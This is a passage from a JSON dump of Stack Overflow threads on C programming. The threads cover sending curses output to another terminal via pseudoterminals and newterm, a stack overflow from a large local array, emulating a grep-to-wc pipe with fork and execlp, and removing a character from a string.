"https://stackoverflow.com/users/6192747/stian-skjelstad"}, "reply_to_user": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461783863, "post_id": 36898334, "comment_id": 61361538, "body": "You are not supposed to, since curses expect to have direct write access to the tty. You can probably cheat and replace the filedescriptor at location 1 after curses has been initiallized with something else, like a pipe"}, {"owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "edited": false, "score": 0, "creation_date": 1461784152, "post_id": 36898334, "comment_id": 61361697, "body": "You can use <code>newterm</code> instead of <code>initscr</code> to initialize curses with some terminal other than stdin/stdout.  You can even call it multiple times to manage multiple terminals."}], "tags": [], "owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": "https://stackoverflow.com/users/6192747/stian-skjelstad"}, "is_accepted": false, "score": 1, "last_activity_date": 1461782671, "creation_date": 1461782671, "answer_id": 36898334, "question_id": 36897795, "link": "https://stackoverflow.com/questions/36897795/sending-curses-input-to-another-terminal-in-c-via-a-fifo/36898334#36898334", "title": "Sending curses input to another terminal in C via a fifo", "body": "<p>curses requires direct access to the terminal in order lookup escape codes, detect resolution etc. You should probably try to have one thread dedicated for curses output in the current (main) terminal, and redirect all debug messages from other threads to either a logfile/pipe/logging facility (and present them inside the curses if you want to)</p>\n"}, {"comments": [{"owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461795260, "post_id": 36898997, "comment_id": 61367824, "body": "You&#39;re answer seems to be the closest for my question but I don&#39;t understand the last part: once I&#39;ve opened the pseudoterminal with fopen should I pass it as the input and pass my fifo as the output? The fifo is used to communicate with the external xterm."}, {"owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461832454, "post_id": 36898997, "comment_id": 61381350, "body": "Also if I call newterm I get a <code>SCREEN *</code>, in know how to write on <code>WINDOW *</code> (with <code>waddch</code> for example) but how to can I write on a <code>SCREEN *</code>?"}, {"owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "reply_to_user": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461854301, "post_id": 36898997, "comment_id": 61397791, "body": "You use <code>set_term</code> to set the current screen you&#39;re working with, and then the global <code>WINDOW *stdscr</code>"}, {"owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461855517, "post_id": 36898997, "comment_id": 61398763, "body": "The program runs asynchronously and some threads may print some text, won&#39;t it alter the output of other threads?"}], "tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": false, "score": 2, "last_activity_date": 1461784696, "creation_date": 1461784696, "answer_id": 36898997, "question_id": 36897795, "link": "https://stackoverflow.com/questions/36897795/sending-curses-input-to-another-terminal-in-c-via-a-fifo/36898997#36898997", "title": "Sending curses input to another terminal in C via a fifo", "body": "<p>curses uses a terminal for its input and output, so if you want to intercept that and make it go somewhere other than a terminal, the easiest method (though non-trivial) is to use a psuedoterminal.  You do that by calling <code>posix_openpt</code> which gives you a pseudoterminal master device.  You then call <code>grantpt</code>, <code>unlockpt</code>, and <code>ptsname</code> to get the name of a terminal device that you can then <code>fopen</code> and pass to curses <code>newterm</code> to initialize the terminal.</p>\n\n<p>Once that is done, everything that curses writes to the terminal will be readble from the master, and everything written to the master will be input to curses.  It is like a fifo, just with all the extra terminal functionality curses expects.</p>\n"}, {"comments": [{"owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461791822, "post_id": 36900885, "comment_id": 61366232, "body": "This is pretty neat, but I can only use opencurses I don&#39;t know ncurses, does that example really use it?"}, {"owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "reply_to_user": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461791905, "post_id": 36900885, "comment_id": 61366284, "body": "The example builds/works with different curses implementations.  There are ifdef&#39;s to use ncurses extensions, but the screenshot did not use those.  (what is &quot;opencurses&quot;?)."}, {"owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461792132, "post_id": 36900885, "comment_id": 61366395, "body": "It believe it&#39;s the name of the UNIX curses library, <code>curses.h</code>."}, {"owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "reply_to_user": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461792353, "post_id": 36900885, "comment_id": 61366501, "body": "ncurses is largely compatible with &quot;X/Open Curses&quot; (as I said, the examples should <i>work</i>)."}, {"owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "reply_to_user": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461792487, "post_id": 36900885, "comment_id": 61366569, "body": "untar the files, run the configure script and make.  If you have problems, there&#39;s a bug-reporting mailing list - this website isn&#39;t <i>that</i>."}, {"owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "edited": false, "score": 0, "creation_date": 1461794002, "post_id": 36900885, "comment_id": 61367275, "body": "All right I think I understand the example a bit more, it needs  the name of the pseudoterminal from the command line arguments and then the output is redirected to them. If I am right it&#39;s a little bit different since in my case I don&#39;t wan&#39;t to open an existing pseudoterminal but output to a fifo that xterm read from because I don&#39;t want to ask the user for pseudoterminal name."}, {"owner": {"reputation": 147, "user_id": 11502722, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XS2XHkagz7M/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdCsSWeZ_glM082uNlW8q6YF76v-A/mo/photo.jpg?sz=128", "display_name": "CourageousPotato", "link": "https://stackoverflow.com/users/11502722/courageouspotato"}, "edited": false, "score": 0, "creation_date": 1558836175, "post_id": 36900885, "comment_id": 99230148, "body": "I was having trouble getting input with my second window newterm; this way with openpty() and -S(ccn) was the solution. Thanks!"}], "tags": [], "owner": {"reputation": 42737, "user_id": 4518274, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UPurS.png?s=128&g=1", "display_name": "Thomas Dickey", "link": "https://stackoverflow.com/users/4518274/thomas-dickey"}, "is_accepted": false, "score": 1, "last_activity_date": 1461798295, "last_edit_date": 1495541257, "creation_date": 1461791155, "answer_id": 36900885, "question_id": 36897795, "link": "https://stackoverflow.com/questions/36897795/sending-curses-input-to-another-terminal-in-c-via-a-fifo/36900885#36900885", "title": "Sending curses input to another terminal in C via a fifo", "body": "<p>ncurses needs a <em>terminal</em> because it initializes the I/O connection.  A FIFO would not be suitable, since it is one-way and (see for example <em><a href=\"https://stackoverflow.com/questions/26747597/perform-action-if-input-is-redirected\">Perform action if input is redirected</a></em>) probably cannot be initialized as a <em>terminal</em>.  ncurses uses the <code>TERM</code> environment variable to lookup the terminal description (the actual <em>terminal</em> is not consulted on the matter).</p>\n\n<p>There is a simple example, <code>ditto</code> in <a href=\"http://invisible-island.net/ncurses/ncurses-examples.html\" rel=\"nofollow noreferrer\">ncurses-examples</a> which uses <a href=\"http://invisible-island.net/xterm/xterm.html\" rel=\"nofollow noreferrer\"><code>xterm</code></a> for multiple input/output screens.  That uses the pty interface, e.g.,</p>\n\n<pre><code>#ifdef USE_XTERM_PTY\n    int amaster;\n    int aslave;\n    char slave_name[1024];\n    char s_option[sizeof(slave_name) + 80];\n    const char *xterm_prog = 0;\n\n    if ((xterm_prog = getenv(\"XTERM_PROG\")) == 0)\n        xterm_prog = \"xterm\";\n\n    if (openpty(&amp;amaster, &amp;aslave, slave_name, 0, 0) != 0\n        || strlen(slave_name) &gt; sizeof(slave_name) - 1)\n        failed(\"openpty\");\n    if (strrchr(slave_name, '/') == 0) {\n        errno = EISDIR;\n        failed(slave_name);\n    }\n    sprintf(s_option, \"-S%s/%d\", slave_name, aslave);\n    if (fork()) {\n        execlp(xterm_prog, xterm_prog, s_option, \"-title\", path, (char *) 0);\n        _exit(0);\n    }\n    fp = fdopen(amaster, \"r+\");\n    if (fp == 0)\n        failed(path);\n#else\n</code></pre>\n\n<p>and <a href=\"http://invisible-island.net/ncurses/man/curs_initscr.3x.html#h3-newterm\" rel=\"nofollow noreferrer\"><code>newterm</code></a> to pass that file descriptor to ncurses:</p>\n\n<pre><code>static void\nopen_screen(DITTO * target, char **source, int length, int which1)\n{   \n    if (which1 != 0) { \n        target-&gt;input =\n            target-&gt;output = open_tty(source[which1]);\n    } else {\n        target-&gt;input = stdin;\n        target-&gt;output = stdout;\n    }\n\n    target-&gt;which1 = which1;   \n    target-&gt;titles = source;\n    target-&gt;length = length;\n    target-&gt;fifo.head = -1;\n    target-&gt;screen = newterm((char *) 0,        /* assume $TERM is the same */\n                             target-&gt;output,\n                             target-&gt;input);\n\n    if (target-&gt;screen == 0)\n        failed(\"newterm\");\n\n    (void) USING_SCREEN(target-&gt;screen, init_screen, target);\n}\n</code></pre>\n\n<p>If you read the first quoted section of <code>ditto</code>, you will notice that it uses an <a href=\"http://invisible-island.net/xterm/manpage/xterm.html\" rel=\"nofollow noreferrer\">option of <code>xterm</code></a> which allows an application to pass a file descriptor to it:</p>\n\n<pre><code>   -Sccn   This option allows xterm to be used  as  an  input  and  output\n           channel  for  an existing program and is sometimes used in spe-\n           cialized applications.  The option value specifies the last few\n           letters  of the name of a pseudo-terminal to use in slave mode,\n           plus the number of  the  inherited  file  descriptor.   If  the\n           option  contains  a \"/\" character, that delimits the characters\n           used for the pseudo-terminal name  from  the  file  descriptor.\n           Otherwise,  exactly two characters are used from the option for\n           the pseudo-terminal name, the remainder is the file descriptor.\n           Examples  (the  first  two  are equivalent since the descriptor\n           follows the last \"/\"):\n\n               -S/dev/pts/123/45\n               -S123/45\n               -Sab34\n\n           Note that xterm does not close any file descriptor which it did\n           not  open for its own use.  It is possible (though probably not\n           portable) to have an application  which  passes  an  open  file\n           descriptor  down  to  xterm  past  the initialization or the -S\n           option to a process running in the xterm.\n</code></pre>\n\n<p>Here is a screenshot showing <code>ditto</code>:</p>\n\n<p><a href=\"https://i.stack.imgur.com/NsYf0.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/NsYf0.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 877, "user_id": 4830221, "user_type": "registered", "accept_rate": 51, "profile_image": "https://graph.facebook.com/10204799712886824/picture?type=large", "display_name": "Nicolas Scotto Di Perto", "link": "https://stackoverflow.com/users/4830221/nicolas-scotto-di-perto"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 645, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1461798295, "creation_date": 1461780944, "last_edit_date": 1461782540, "question_id": 36897795, "link": "https://stackoverflow.com/questions/36897795/sending-curses-input-to-another-terminal-in-c-via-a-fifo", "title": "Sending curses input to another terminal in C via a fifo", "body": "<p>My C program run multiple thread in the terminal that print messages asynchronously. I'd like a thread to show curses output, but as it is asynchronous it must be in another terminal.</p>\n\n<p>My idea is to write the curses output to a fifo and open a terminal with\n<code>cat fifo</code>.</p>\n\n<p>But how could I recover the ouput the curses out and output it to a file?</p>\n\n<p>Thank you.</p>\n"}, {"tags": ["c", "arrays", "stack-overflow"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 1, "creation_date": 1461780802, "post_id": 36897733, "comment_id": 61359572, "body": "Use pointer and allocate it memory ."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1461780872, "post_id": 36897733, "comment_id": 61359619, "body": "Try making the array <code>static</code>."}, {"owner": {"reputation": 19, "user_id": 5373609, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-JWuZA6bFmcY/AAAAAAAAAAI/AAAAAAAAAHc/JcKPW_O3xys/photo.jpg?sz=128", "display_name": "Rupesh", "link": "https://stackoverflow.com/users/5373609/rupesh"}, "edited": false, "score": 0, "creation_date": 1461780973, "post_id": 36897733, "comment_id": 61359680, "body": "I have tried using static but that doesn&#39;t seems to work."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 0, "creation_date": 1461783221, "post_id": 36897733, "comment_id": 61361136, "body": "Are you saying the <i>compiler</i> is crashing when you try to build this?  Or is your program crashing when you try to run it?  Or is the compiler exiting with an error or warning?  FWIW, I&#39;m able to build this code on SLES 10 using gcc 4.1.2 with <code>-std=c11 -pedantic -Wall -Werror</code> and get no errors or warnings  during compilation, and it doesn&#39;t crash when I run it.  Granted, it&#39;s taking a while to run (O(n^2) algorithms tend to run slowly when n gets large), but it&#39;s not crashing.  Here&#39;s a thought, though, try using <code>unsigned int</code> for <code>p</code> and <code>primeindex</code>."}], "owner": {"reputation": 19, "user_id": 5373609, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-JWuZA6bFmcY/AAAAAAAAAAI/AAAAAAAAAHc/JcKPW_O3xys/photo.jpg?sz=128", "display_name": "Rupesh", "link": "https://stackoverflow.com/users/5373609/rupesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 180, "favorite_count": 0, "closed_date": 1461781085, "answer_count": 0, "score": 0, "last_activity_date": 1461780735, "creation_date": 1461780735, "question_id": 36897733, "link": "https://stackoverflow.com/questions/36897733/is-it-possible-to-store-1-million-items-in-array-in-c-language", "closed_reason": "Duplicate", "title": "Is it possible to store 1 million items in array in c language?", "body": "<p>The program is crashing each time I am compiling it.I need to find the 10001 th prime number. I know this is a case of stack overflow but could not solve it.Tell me the solution to the problem.</p>\n\n<pre><code>// program to find 10001th prime number. \n#include&lt;stdio.h&gt;\n#define MAX 1000000\nint main()\n{\nint primes[MAX];\nint i,p,isprime;\nprimes[0]=2;\nprimes[1]=3;\nint primeindex=2;\n\n\nfor(p=5;p&lt;MAX;p=p+2)  //iterating over all the odd numbers\n{  isprime=1;    // assuming that the number chosen is prime\n\n    for(i=0;i&lt;primeindex;i++)\n    {\n        if(p % primes[i]==0)\n        isprime=0;\n    }\n\n    if(isprime ==1)\n    { \n     primes[primeindex]=p;   //updating the list of prime numbers\n     primeindex ++;     // updating the list of prime index\n    }\n   }\n     printf(\"%d\\n\",primes[10000]); //supposed to print 10001 prime number   \n\n     printf(\" %d\",primeindex);\n\n   return 0;\n\n  }\n</code></pre>\n"}, {"tags": ["c", "bash", "pipe", "fork"], "comments": [{"owner": {"reputation": 384463, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1461781587, "post_id": 36897690, "comment_id": 61360067, "body": "If it helps, that would just be <code>{ grep text | wc -l ; } &lt; file.txt &gt; out.txt</code> in shell. The input redirection applies to the first command in the pipe, the output to the last command."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4798789"}, "edited": false, "score": 0, "creation_date": 1461783358, "post_id": 36897989, "comment_id": 61361218, "body": "I understand what you did but I would like to execute the commands only on the child processes."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461783501, "post_id": 36897989, "comment_id": 61361307, "body": "@snobis Well, then you only have to fork once more for the grep-process."}], "tags": [], "owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "is_accepted": false, "score": 2, "last_activity_date": 1461781541, "creation_date": 1461781541, "answer_id": 36897989, "question_id": 36897690, "link": "https://stackoverflow.com/questions/36897690/combining-two-commands-with-a-pipe/36897989#36897989", "title": "Combining two commands with a pipe", "body": "<p>Your approach is indeed a bit overcomplicated. This can be achieved with just one childprocess and a single pipe (just as in the original shell command). Let's have a look at it:</p>\n\n<pre><code>grep text &lt; file.txt | wc -l &gt; out.txt\n</code></pre>\n\n<p>This</p>\n\n<ul>\n<li>creates a pipe</li>\n<li>forks two processes</li>\n<li>makes grep write to the pipe</li>\n<li>makes wc read from the pipe</li>\n</ul>\n\n<p>But it is enough to fork only one process, since we do not need to return to the parent process. This results in the following code:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main (void) {\n    int fd[2];\n\n    pipe(fd);\n\n    if (fork()) {\n        // Child process\n        dup2(fd[0], 0); // wc reads from the pipe\n        close(fd[0]);\n        close(fd[1]);\n        execlp(\"wc\", \"wc\", \"-l\", NULL);\n    } else {\n        // Parent process\n        dup2(fd[1], 1); // grep writes to the pipe\n        close(fd[0]);\n        close(fd[1]);\n        execlp(\"grep\", \"grep\", \"celio\", NULL);\n    }\n    exit(EXIT_FAILURE);\n}\n</code></pre>\n\n<p>The <code>exit()</code> is only reached if one of the <code>execlp()</code>'s fails.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4798789"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2574, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1461781794, "creation_date": 1461780613, "last_edit_date": 1461781794, "question_id": 36897690, "link": "https://stackoverflow.com/questions/36897690/combining-two-commands-with-a-pipe", "title": "Combining two commands with a pipe", "body": "<p>I'm trying to \"merge\" two commands in one (nonexistent) command and pipe it.By this I mean.. Suppose that you have these two commands: <code>grep text &lt; file.txt | wc -l &gt; out.txt</code>, the (nonexistent) command that could represent this two commands could be something like <code>(grepwc -l &lt; file.txt)</code> which then outputs the number of lines into the out.txt. Basically these (grepwc) command should have the same behavior as the <code>grep text &lt; file.txt | wc -l &gt; out.txt</code> but shorter.</p>\n\n<p>I tried something like this, but I think my approach is far to accomplish the goal. I use a structure named commlist which contains the commands already parsed by cmd, argc and argv. inputfile and outputfile are the pathnames of the files used on open().</p>\n\n<p>The struct I'm using.</p>\n\n<pre><code>typedef struct command {\nchar *cmd;              \nint argc;               \nchar *argv[MAXARGS+1];  \nstruct command *next;\n} COMMAND;\n</code></pre>\n\n<p>and the code:</p>\n\n<pre><code>void execute(COMMAND *commlist) {\n  int fd[2];\n  pid_t pid;\n  int n_pipes=2; //pipes needed\n  COMMAND *aux = commlist;\n\n  int i;\n  for(i=0;i&lt;n_pipes; i++){\n    int oldfd = 0;\n\n    if(fd[0]!=0){\n      close(fd[1]);\n      oldfd = fd[0];\n    }\n      pipe(fd);\n\n      if((pid=fork())&lt;0){perror(\"Fork Failed\");}\n      else \n        if(pid == 0){\n\n          if(inputfile!=NULL){\n            int in = open(inputfile,O_RDONLY);\n            dup2(in,STDIN_FILENO);\n            inputfile = NULL;\n          }\n\n          if(outputfile != NULL){\n            int out = open(outputfile, O_RDWR |O_CREAT | O_TRUNC, S_IRWXU);\n            dup2(out,STDOUT_FILENO);\n            outputfile = NULL;\n          }\n\n          if(oldfd)\n            dup2(oldfd,STDIN_FILENO);\n\n          if(commlist-&gt;cmd == \"grepwc\"){\n            if(i==0){\n              if(execlp(\"grep\",\"grep\",\"celio\",NULL)&lt;0){\n                perror(\"Bad command\");\n                exit(1);    \n              }\n            }\n\n            if(i==1){\n              if(execlp(\"wc\",\"wc\",\"-l\",NULL) &lt; 0){\n                perror(\"Bad command\");\n                exit(1);\n              }\n            }\n          }\n        }//child\n  }\n}\n</code></pre>\n\n<p>The full code is here:</p>\n\n<p><a href=\"http://pastebin.com/tYGWwUjS\" rel=\"nofollow\">http://pastebin.com/tYGWwUjS</a></p>\n\n<p><a href=\"http://pastebin.com/sNJhEg2Y\" rel=\"nofollow\">http://pastebin.com/sNJhEg2Y</a></p>\n"}, {"tags": ["c", "function", "pointers", "c-strings"], "comments": [{"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 1, "creation_date": 1461780647, "post_id": 36897560, "comment_id": 61359466, "body": "You sure you want to reset <code>i</code> and <code>j</code> to <code>0</code> and <code>1</code> respectively for each iteration in <code>remove_colon</code>?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1461780830, "post_id": 36897560, "comment_id": 61359589, "body": "if your <code>remove_colon()</code> function ever does return, it will necessarily be the case that the return value (<code>x</code>) points to an empty string, because that&#39;s the only way the loop can exit."}, {"owner": {"reputation": 71, "user_id": 6262982, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d591ceb609bb526228030aeac7d6812f?s=128&d=identicon&r=PG&f=1", "display_name": "emuterisa", "link": "https://stackoverflow.com/users/6262982/emuterisa"}, "reply_to_user": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1461780891, "post_id": 36897560, "comment_id": 61359631, "body": "@Downvoter ok I fixed the code, but still come up with segmentation fault."}, {"owner": {"reputation": 5097, "user_id": 5058871, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fe7ecb8d6a0171ca6462d59ab0663c25?s=128&d=identicon&r=PG", "display_name": "Dov Benyomin Sohacheski", "link": "https://stackoverflow.com/users/5058871/dov-benyomin-sohacheski"}, "edited": false, "score": 1, "creation_date": 1461780978, "post_id": 36897560, "comment_id": 61359682, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/21371246/replacing-a-character-in-a-c-string\">Replacing a character in a c string</a>"}, {"owner": {"reputation": 918, "user_id": 2133905, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/Y4wcC.jpg?s=128&g=1", "display_name": "SGM1", "link": "https://stackoverflow.com/users/2133905/sgm1"}, "edited": false, "score": 0, "creation_date": 1461781370, "post_id": 36897560, "comment_id": 61359930, "body": "By wording, your approach sounds correct, if it is expliciting only 1 character is being replaced."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461781435, "post_id": 36897560, "comment_id": 61359978, "body": "<code>remove_colon()   while(*x != &#39;\\0&#39;) { ...} </code> does not move the null character."}, {"owner": {"reputation": 4046, "user_id": 4971422, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4abf51a937ddda51cc6813445605c50?s=128&d=identicon&r=PG&f=1", "display_name": "FredK", "link": "https://stackoverflow.com/users/4971422/fredk"}, "edited": false, "score": 0, "creation_date": 1461782164, "post_id": 36897560, "comment_id": 61360457, "body": "Much simpler to just use memmove() after finding the colon."}], "answers": [{"comments": [{"owner": {"reputation": 918, "user_id": 2133905, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/Y4wcC.jpg?s=128&g=1", "display_name": "SGM1", "link": "https://stackoverflow.com/users/2133905/sgm1"}, "edited": false, "score": 0, "creation_date": 1461781643, "post_id": 36897973, "comment_id": 61360109, "body": "Then you&#39;d have to null terminate after the loop is finished, if I&#39;m not mistaken."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 918, "user_id": 2133905, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/Y4wcC.jpg?s=128&g=1", "display_name": "SGM1", "link": "https://stackoverflow.com/users/2133905/sgm1"}, "edited": false, "score": 0, "creation_date": 1461781792, "post_id": 36897973, "comment_id": 61360206, "body": "@SGM, yep (fixed)."}], "tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 0, "last_activity_date": 1461781964, "last_edit_date": 1461781964, "creation_date": 1461781495, "answer_id": 36897973, "question_id": 36897560, "link": "https://stackoverflow.com/questions/36897560/removing-a-character-from-a-string-in-c/36897973#36897973", "title": "Removing a character from a string in C", "body": "<p>Your loop in <code>remove_colon()</code> should be:</p>\n\n<pre><code>while(x[y+i] != '\\0')\n{\n    x[y+i] = x[y+j];\n    i++;\n    j++;\n}\nx[y+i]= '\\0';\n</code></pre>\n\n<p>and</p>\n\n<pre><code>while(y != '\\0')\n{\n    printf(\"%s\",y);\n    